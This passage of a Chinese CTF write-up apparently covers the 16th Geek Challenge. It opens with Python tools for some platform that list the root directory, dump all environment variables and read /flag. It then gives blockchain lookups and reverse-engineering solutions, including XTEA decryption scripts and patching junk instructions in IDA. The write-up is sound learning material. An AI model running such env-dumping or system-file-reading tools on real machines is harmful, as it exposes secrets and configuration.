entries = <span class="built_in">sorted</span>(os.listdir(<span class="string">&quot;/&quot;</span>))</span><br><span class="line">        <span class="comment"># 类似 ls 的简单格式化：每行多个项目，避免太长</span></span><br><span class="line">        cols = <span class="number">4</span></span><br><span class="line">        lines = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(entries), cols):</span><br><span class="line">            row = entries[i:i+cols]</span><br><span class="line">            lines.append(<span class="string">&quot;  &quot;</span>.join(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span>&quot;</span> <span class="keyword">for</span> name <span class="keyword">in</span> row))</span><br><span class="line">        content = <span class="string">&quot;[+] ls /\n&quot;</span> + <span class="string">&quot;\n&quot;</span>.join(lines)</span><br><span class="line">        <span class="keyword">return</span> ToolResult(content=content)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> ToolResult(content=<span class="string">f&quot;[-] 列目录失败：<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将工具实例暴露给平台</span></span><br><span class="line">tool = ls_root</span><br></pre></td></tr></table></figure>

<p>print_env工具</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Any</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 平台会自动注入 ToolResult / ToolExecutionContext / tool 装饰器与类型</span></span><br><span class="line"><span class="meta">@tool(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="meta">    name=<span class="string">&quot;print_env&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta">    description=<span class="string">&quot;打印环境变量（等价于 `env`）。不接受参数。&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta">    input_schema=&#123;</span></span></span><br><span class="line"><span class="params"><span class="meta">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;object&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta">        <span class="string">&quot;properties&quot;</span>: &#123;&#125;,</span></span></span><br><span class="line"><span class="params"><span class="meta">        <span class="string">&quot;additionalProperties&quot;</span>: <span class="literal">False</span></span></span></span><br><span class="line"><span class="params"><span class="meta">    &#125;</span></span></span><br><span class="line"><span class="params"><span class="meta"></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">print_env</span>(<span class="params">arguments: <span class="built_in">dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>], context: ToolExecutionContext</span>) -&gt; ToolResult:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        lines = [<span class="string">f&quot;<span class="subst">&#123;k&#125;</span>=<span class="subst">&#123;v&#125;</span>&quot;</span> <span class="keyword">for</span> k, v <span class="keyword">in</span> os.environ.items()]</span><br><span class="line">        lines.sort()</span><br><span class="line">        content = <span class="string">&quot;[+] env\n&quot;</span> + <span class="string">&quot;\n&quot;</span>.join(lines)</span><br><span class="line">        <span class="keyword">return</span> ToolResult(content=content)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> ToolResult(content=<span class="string">f&quot;[-] 获取环境变量失败：<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将工具实例暴露给平台</span></span><br><span class="line">tool = print_env</span><br></pre></td></tr></table></figure>

<p>cat_flag工具</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Any</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 平台会自动注入 ToolResult / ToolExecutionContext / tool 装饰器与类型</span></span><br><span class="line"><span class="meta">@tool(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="meta">    name=<span class="string">&quot;cat_flag&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta">    description=<span class="string">&quot;读取 /flag（等价于 `cat /flag`）。不接受参数。&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta">    input_schema=&#123;</span></span></span><br><span class="line"><span class="params"><span class="meta">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;object&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta">        <span class="string">&quot;properties&quot;</span>: &#123;&#125;,</span></span></span><br><span class="line"><span class="params"><span class="meta">        <span class="string">&quot;additionalProperties&quot;</span>: <span class="literal">False</span></span></span></span><br><span class="line"><span class="params"><span class="meta">    &#125;</span></span></span><br><span class="line"><span class="params"><span class="meta"></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">cat_flag</span>(<span class="params">arguments: <span class="built_in">dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>], context: ToolExecutionContext</span>) -&gt; ToolResult:</span><br><span class="line">    path = <span class="string">&quot;/flag&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read(<span class="number">200_000</span>)  <span class="comment"># 防止极端情况下输出过大</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            text = data.decode(<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;replace&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            text = <span class="built_in">repr</span>(data[:<span class="number">1024</span>])</span><br><span class="line">        <span class="keyword">return</span> ToolResult(content=<span class="string">f&quot;[+] READ <span class="subst">&#123;path&#125;</span>\n<span class="subst">&#123;text&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> ToolResult(content=<span class="string">f&quot;[-] 无法读取 <span class="subst">&#123;path&#125;</span>：<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将工具实例暴露给平台</span></span><br><span class="line">tool = cat_flag</span><br></pre></td></tr></table></figure>

<h3 id="Bite-off-picture"><a href="#Bite-off-picture" class="headerlink" title="Bite off picture"></a>Bite off picture</h3><p>压缩包末尾是个倒序base64，解码获得密码werwerr<br>之后修复png宽高即可</p>
<h3 id="1Z-Sign"><a href="#1Z-Sign" class="headerlink" title="1Z_Sign"></a>1Z_Sign</h3><p>etherscan.io搜索0x1d3040872d9c3d15d47323996926c2aa5c7b636fc7209f701301878dcf438598</p>
<p>可以看到交易回执的logs</p>
<p>定位 Uniswap V4: Pool Manager 合约地址 0x000000000004444c5dc75cb358380d2e3de08a90 的 Swap 事件。<br><img src="/2025/10/30/%E7%AC%AC16%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/1.png" alt="alt text"></p>
<p>将 fee 由 ppm（1e-6） 转换为百分比，因为 1% &#x3D; 10,000 ppm。所以 fee &#x3D; 9900 → 9900 &#x2F; 10000 &#x3D; 0.99%。</p>
<p>SYC{0.99%}</p>
<h3 id="Blockchain-SignIn"><a href="#Blockchain-SignIn" class="headerlink" title="Blockchain SignIn"></a>Blockchain SignIn</h3><p>去sepolia.etherscan.io搜索0x208e0465ea757073d0ec6af9094e5404ef81a213970eb580fa6a28a3af4669d6<br>在More details的Input Data里找到hex的flag</p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="encode"><a href="#encode" class="headerlink" title="encode"></a>encode</h3><p>在 IDA Pro 中观察到的关键函数：</p>
<ul>
<li><code>main</code>: 读取输入后，对经自定义 <code>scanf</code> 处理过的缓冲逐字节异或 0x5A，然后进行 Base64 编码并与常量进行比较。</li>
<li><code>scanf</code>: 并非标准库实现。它先逐字节读入、去空白，随后调用 <code>enc(buf, len, out)</code> 将输入加密，返回的加密长度写入全局变量 <code>encrypted_len</code>，并把加密结果写回原缓冲。</li>
<li><code>enc</code>: 对数据进行 8 字节对齐的 PKCS#7 填充，然后按 8 字节块调用 <code>enc_block</code> 加密，返回加密后长度（8 的倍数）。</li>
<li><code>enc_block</code>: XTEA（32 轮）加密，密钥为 16 字节常量。</li>
<li>常量&#x2F;字符串：<ul>
<li>XTEA 密钥：<code>&quot;geek2025reverse!&quot;</code>（地址 <code>0x100003ea0</code>）</li>
<li>Base64 表：地址 <code>0x100003eb0</code></li>
<li>比对用的 64 字节 Base64 串：<code>vBzX30Koxl3HpDaYaFJKhyB/1ckuVCnc4wZhrwUWeNuZkAxr+Qn5UaYbpvymmCrk</code>（地址 <code>0x100003ef1</code>）</li>
</ul>
</li>
</ul>
<p>入口 <code>main</code> 的核心逻辑：</p>
<ol>
<li>自定义 <code>scanf(buf, cap)</code> 将明文经 <code>enc</code> 加密，结果放回 <code>buf</code>，并设置 <code>encrypted_len</code>。</li>
<li><code>for i in [0, encrypted_len)</code>: <code>v5[i] = buf[i] ^ 0x5A</code>。</li>
<li><code>base64_encode(v5)</code> 的结果需与地址 <code>0x100003ef1</code> 的 64 字节常量逐字节相等；若相等输出 Congratulations。</li>
</ol>
<p>据此可得整体数据流：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入明文 --enc(XTEA/ECB + PKCS#7)--&gt; 密文C --逐字节 ^ 0x5A--&gt; C&#x27; --Base64--&gt; 常量目标串</span><br></pre></td></tr></table></figure>

<p>因此逆向步骤为：</p>
<ol>
<li>Base64 解码目标串得到 <code>C&#39;</code>；</li>
<li><code>C = C&#39; ^ 0x5A</code>；</li>
<li>用 XTEA-ECB（32 轮），密钥 <code>geek2025reverse!</code> 对 <code>C</code> 逐块（8 字节）解密；</li>
<li>去掉 PKCS#7 填充，得到原始明文（flag）。</li>
</ol>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">TARGET_B64 = <span class="string">&quot;vBzX30Koxl3HpDaYaFJKhyB/1ckuVCnc4wZhrwUWeNuZkAxr+Qn5UaYbpvymmCrk&quot;</span></span><br><span class="line">KEY = <span class="string">b&quot;geek2025reverse!&quot;</span>  <span class="comment"># 16-byte XTEA key</span></span><br><span class="line">XOR_BYTE = <span class="number">0x5A</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xtea_decrypt_block</span>(<span class="params">block: <span class="built_in">bytes</span>, key: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Decrypt a single 8-byte block with XTEA (32 rounds), big-endian words.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(block) == <span class="number">8</span> <span class="keyword">and</span> <span class="built_in">len</span>(key) == <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">be32</span>(<span class="params">b: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(b, <span class="string">&quot;big&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">to_be32</span>(<span class="params">x: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="keyword">return</span> x.to_bytes(<span class="number">4</span>, <span class="string">&quot;big&quot;</span>)</span><br><span class="line"></span><br><span class="line">    v0 = be32(block[:<span class="number">4</span>])</span><br><span class="line">    v1 = be32(block[<span class="number">4</span>:])</span><br><span class="line">    k = [be32(key[i * <span class="number">4</span> : (i + <span class="number">1</span>) * <span class="number">4</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    total = (delta * <span class="number">32</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1 = (v1 - ((((v0 &gt;&gt; <span class="number">5</span>) ^ ((v0 &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xFFFFFFFF</span>)) + v0) ^ ((total + k[(total &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]) &amp; <span class="number">0xFFFFFFFF</span>))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        total = (total - delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 = (v0 - ((((v1 &gt;&gt; <span class="number">5</span>) ^ ((v1 &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xFFFFFFFF</span>)) + v1) ^ ((total + k[total &amp; <span class="number">3</span>]) &amp; <span class="number">0xFFFFFFFF</span>))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> to_be32(v0) + to_be32(v1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_flag</span>() -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="comment"># 1) Base64 decode</span></span><br><span class="line">    decoded = base64.b64decode(TARGET_B64)</span><br><span class="line">    <span class="comment"># 2) XOR 0x5A</span></span><br><span class="line">    cipher = <span class="built_in">bytes</span>(b ^ XOR_BYTE <span class="keyword">for</span> b <span class="keyword">in</span> decoded)</span><br><span class="line">    <span class="comment"># 3) XTEA-ECB 解密</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(cipher) % <span class="number">8</span> == <span class="number">0</span></span><br><span class="line">    pt = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cipher), <span class="number">8</span>):</span><br><span class="line">        pt.extend(xtea_decrypt_block(cipher[i : i + <span class="number">8</span>], KEY))</span><br><span class="line">    <span class="comment"># 4) 去 PKCS#7 填充</span></span><br><span class="line">    pad = pt[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="number">1</span> &lt;= pad &lt;= <span class="number">8</span> <span class="keyword">and</span> pt.endswith(<span class="built_in">bytes</span>([pad]) * pad):</span><br><span class="line">        pt = pt[:-pad]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(pt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    flag = recover_flag()</span><br><span class="line">    <span class="built_in">print</span>(flag.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br></pre></td></tr></table></figure>

<h3 id="ez-pyyy"><a href="#ez-pyyy" class="headerlink" title="ez_pyyy"></a>ez_pyyy</h3><p>给了pyc，直接反编译</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">cipher = [<span class="number">48</span>, <span class="number">55</span>, <span class="number">57</span>, <span class="number">50</span>, <span class="number">53</span>, <span class="number">55</span>, <span class="number">53</span>, <span class="number">50</span>, <span class="number">52</span>, <span class="number">50</span>, <span class="number">48</span>, <span class="number">55</span>, <span class="number">101</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">50</span>, <span class="number">52</span>, <span class="number">50</span>, <span class="number">52</span>, <span class="number">50</span>, <span class="number">48</span>, <span class="number">55</span>, <span class="number">53</span>, <span class="number">55</span>, <span class="number">55</span>, <span class="number">55</span>, <span class="number">50</span>, <span class="number">54</span>, <span class="number">53</span>, <span class="number">55</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">55</span>, <span class="number">55</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">98</span>, <span class="number">55</span>, <span class="number">97</span>, <span class="number">54</span>, <span class="number">50</span>, <span class="number">53</span>, <span class="number">56</span>, <span class="number">52</span>, <span class="number">50</span>, <span class="number">52</span>, <span class="number">99</span>, <span class="number">54</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="number">52</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="number">54</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_to_hex_bytes</span>(<span class="params">s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">return</span> s.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">data: <span class="built_in">bytes</span>, key: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([b ^ key <span class="keyword">for</span> b <span class="keyword">in</span> data])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">en3</span>(<span class="params">b: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> b &lt;&lt; <span class="number">4</span> &amp; <span class="number">240</span> | b &gt;&gt; <span class="number">4</span> &amp; <span class="number">15</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">en33</span>(<span class="params">data: <span class="built_in">bytes</span>, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;整体 bitstream 循环左移 n 位&quot;&quot;&quot;</span></span><br><span class="line">    bit_len = <span class="built_in">len</span>(data) * <span class="number">8</span></span><br><span class="line">    n = n % bit_len</span><br><span class="line">    val = <span class="built_in">int</span>.from_bytes(data, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    val = (val &lt;&lt; n | val &gt;&gt; bit_len - n) &amp; (<span class="number">1</span> &lt;&lt; bit_len) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> val.to_bytes(<span class="built_in">len</span>(data), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    data = str_to_hex_bytes(flag)</span><br><span class="line">    data = enc(data, <span class="number">17</span>)</span><br><span class="line">    data = <span class="built_in">bytes</span>([en3(b) <span class="keyword">for</span> b <span class="keyword">in</span> data])</span><br><span class="line">    data = data[::-<span class="number">1</span>]</span><br><span class="line">    data = en33(data, <span class="number">32</span>)</span><br><span class="line">    <span class="keyword">if</span> data.<span class="built_in">hex</span>() == cipher:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Correct! &#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Wrong！！！！！！！！&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">cipher = [<span class="number">48</span>, <span class="number">55</span>, <span class="number">57</span>, <span class="number">50</span>, <span class="number">53</span>, <span class="number">55</span>, <span class="number">53</span>, <span class="number">50</span>, <span class="number">52</span>, <span class="number">50</span>, <span class="number">48</span>, <span class="number">55</span>, <span class="number">101</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">50</span>, <span class="number">52</span>, <span class="number">50</span>, <span class="number">52</span>, <span class="number">50</span>, <span class="number">48</span>, <span class="number">55</span>, <span class="number">53</span>, <span class="number">55</span>, <span class="number">55</span>, <span class="number">55</span>, <span class="number">50</span>, <span class="number">54</span>, <span class="number">53</span>, <span class="number">55</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">55</span>, <span class="number">55</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">98</span>, <span class="number">55</span>, <span class="number">97</span>, <span class="number">54</span>, <span class="number">50</span>, <span class="number">53</span>, <span class="number">56</span>, <span class="number">52</span>, <span class="number">50</span>, <span class="number">52</span>, <span class="number">99</span>, <span class="number">54</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="number">52</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="number">54</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rot_right_bitstream</span>(<span class="params">data: <span class="built_in">bytes</span>, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    bit_len = <span class="built_in">len</span>(data) * <span class="number">8</span></span><br><span class="line">    n %= bit_len</span><br><span class="line">    val = <span class="built_in">int</span>.from_bytes(data, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">    val = ((val &gt;&gt; n) | ((val &lt;&lt; (bit_len - n)) &amp; ((<span class="number">1</span> &lt;&lt; bit_len) - <span class="number">1</span>))) &amp; ((<span class="number">1</span> &lt;&lt; bit_len) - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> val.to_bytes(<span class="built_in">len</span>(data), <span class="string">&quot;big&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nibble_swap</span>(<span class="params">b: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> ((b &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xF0</span>) | ((b &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1) 题中比较的是 data.hex() == cipher，因此 cipher 实际是十六进制字符串的 ASCII 码</span></span><br><span class="line">hex_str = <span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> cipher)</span><br><span class="line">enc_end = <span class="built_in">bytes</span>.fromhex(hex_str)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2) 逆 en33 左移 32 位 =&gt; 全体比特右移 32 位</span></span><br><span class="line">stage = rot_right_bitstream(enc_end, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3) 逆 bytes[::-1]</span></span><br><span class="line">stage = stage[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4) 逆 en3（高低 4bit 互换，自反操作）</span></span><br><span class="line">stage = <span class="built_in">bytes</span>(nibble_swap(b) <span class="keyword">for</span> b <span class="keyword">in</span> stage)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5) 逆 XOR 17</span></span><br><span class="line">orig = <span class="built_in">bytes</span>(b ^ <span class="number">17</span> <span class="keyword">for</span> b <span class="keyword">in</span> stage)</span><br><span class="line"></span><br><span class="line">flag = orig.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h3 id="only-flower"><a href="#only-flower" class="headerlink" title="only_flower"></a>only_flower</h3><ul>
<li>关键函数：<ul>
<li><code>_main</code> 0x401602（读入、长度&#x2F;格式检查、分支打印）</li>
<li><code>_checkcheck</code> 0x401543（前后缀与大括号格式检查）</li>
<li><code>_encrypt</code> 0x40149A（核心加密&#x2F;混淆循环）</li>
<li><code>rol8</code> 0x401460（8-bit左旋）</li>
</ul>
</li>
<li>明文Key：位于 <code>_KEY</code>（地址 0x405064）&#x3D; <code>GEEK2025</code></li>
<li>参考密文数组：起始于 0x405070，长度 DWORD &#x3D; 28（0x1C）</li>
</ul>
<p>本题的难点是“花指令”（junk code）干扰IDA反汇编&#x2F;反编译。主要表现为：</p>
<ul>
<li>在关键代码路径处插入 <code>jmp short -1</code>（字节 EB FF）死循环，导致CFG被截断；</li>
<li>零散无意义字节流（如 <code>c0 48</code>…）使线性反汇编错位，反编译器产生 <code>JUMPOUT()</code> 等。</li>
</ul>
<p>通过在IDA中将这些花指令 NOP 掉（或转为数据并重建代码）后，控制流即可恢复，逻辑清晰。</p>
<hr>
<h4 id="花指令定位与修复"><a href="#花指令定位与修复" class="headerlink" title="花指令定位与修复"></a>花指令定位与修复</h4><p>以下均在 IDA Pro 中完成：</p>
<ol>
<li>定位症状</li>
</ol>
<ul>
<li>对关键函数（<code>_main</code>、<code>_checkcheck</code>、<code>_encrypt</code>）按 F5 观察伪代码，若出现 <code>JUMPOUT(...)</code> 或只显示极少数语句，即为受花指令影响。</li>
<li>按空格查看反汇编，若看到 <code>EB FF</code>（<code>jmp short -1</code>）或明显“不可达&#x2F;自跳转”的地方，即为花指令。</li>
</ul>
<ol start="2">
<li>修复方法（两种常用）</li>
</ol>
<ul>
<li>直接补丁（推荐）：<ul>
<li>菜单 Edit -&gt; Patch program -&gt; Assemble，选中 <code>jmp short -1</code> 的地址，</li>
<li>将指令改为 <code>nop</code>（需要两字节，可写入 <code>nop; nop</code>），应用补丁。</li>
</ul>
</li>
<li>转数据&#x2F;重建代码：<ul>
<li>对不应当执行的垃圾字节（影响解码的“乱序片段”）按 <code>D</code> 先转为数据，</li>
<li>再在真实入口处按 <code>C</code> 重建指令，必要时重建函数边界（Edit function -&gt; Set range）。</li>
</ul>
</li>
</ul>
<ol start="3">
<li>本题实际修复点（将 <code>EB FF</code> 改为 <code>90 90</code>）</li>
</ol>
<ul>
<li><code>_main</code>：<ul>
<li>0x40161F、0x40164E、0x40169A、0x4016BF、0x4016EE、0x401740、0x401766、0x401790、0x4017AE</li>
</ul>
</li>
<li><code>_encrypt</code>：<ul>
<li>0x4014C7、0x4014F0、0x401510</li>
</ul>
</li>
<li><code>_checkcheck</code>：<ul>
<li>0x401556、0x401575、0x4015B1</li>
</ul>
</li>
</ul>
<p>修复后，反汇编&#x2F;反编译会逐步恢复。可适度多次按 F5 让Hex-Rays重新分析。</p>
<hr>
<h4 id="逻辑复原"><a href="#逻辑复原" class="headerlink" title="逻辑复原"></a>逻辑复原</h4><ol>
<li>格式检查（<code>_checkcheck</code>）<br>反混淆后可读出的关键比较（汇编解析）：</li>
</ol>
<ul>
